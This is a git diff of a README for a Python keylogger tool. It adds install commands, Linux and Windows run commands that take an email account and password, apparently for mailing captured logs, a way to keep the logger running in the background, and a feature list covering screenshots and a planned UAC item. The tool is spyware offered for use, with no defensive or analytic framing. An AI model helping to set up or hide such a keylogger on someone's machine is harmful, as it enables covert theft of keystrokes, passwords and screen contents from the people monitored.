@@ -15,11 +15,17 @@ the last one rest is pyscreenshot
 ## How i install this libs ?
 **sample just copy and past in your terminal**
 ```
-pip install pyscreenshot pyxhook & sudo apt install python-xlib
+pip install pyscreenshot pyxhook && sudo apt install python-xlib
 ```
 
-## How i use it ?
->python keylogger.py --email "" --password ""
+## How i use it on Linux ?
+>python keylogger.py --email "example@exeple.com" --password "example1234"
+
+## How i use it on Windows?
+>./keylogger.exe -e "example@exemple.com" -p "example1234" --local C:/anyware/Desktop/logs.txt
+
+## How to let the program running on background ?
+**this is a simple just run the program with & or on the end**
 
 ## Syntax 
 ```
@@ -38,8 +44,10 @@ distributed under license GNU GENERAL PUBLIC LICENSE version 3 by [Free Software
 
 ## Feature
  - [x] take screenshot of window 
+ - [x] Windows Version 
+ - [ ] Add UAC on Windows Version  
  - [x] Arguments and make a binare of the program 
- - [ ] Make the program run in the background
+ - [x] Make the program run in the background
  - [x] Add the Pyinstaller 
 
 ### Contributing
